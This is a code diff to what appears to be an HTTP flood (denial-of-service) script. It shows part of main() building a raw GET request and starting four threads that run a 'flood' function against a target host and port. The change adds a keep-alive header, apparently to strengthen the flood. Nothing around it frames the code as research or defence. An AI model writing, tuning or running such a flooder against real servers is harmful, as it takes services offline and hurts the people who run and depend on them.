@@ -45,7 +45,7 @@ def main():
     addr = (hostname,port)
 
     uri = url.replace(f'{scheme}://{hostname}:{port}','') or '/'
-    pkt = f'GET {uri} HTTP/1.1\r\nHost: {hostname}\r\n\r\n'.encode()
+    pkt = f'GET {uri} HTTP/1.1\r\nHost: {hostname}\r\nConnection: keep-alive\r\n\r\n'.encode()
 
     for _ in range(4):
         t = Thread(target=flood,args=(scheme,addr,pkt))
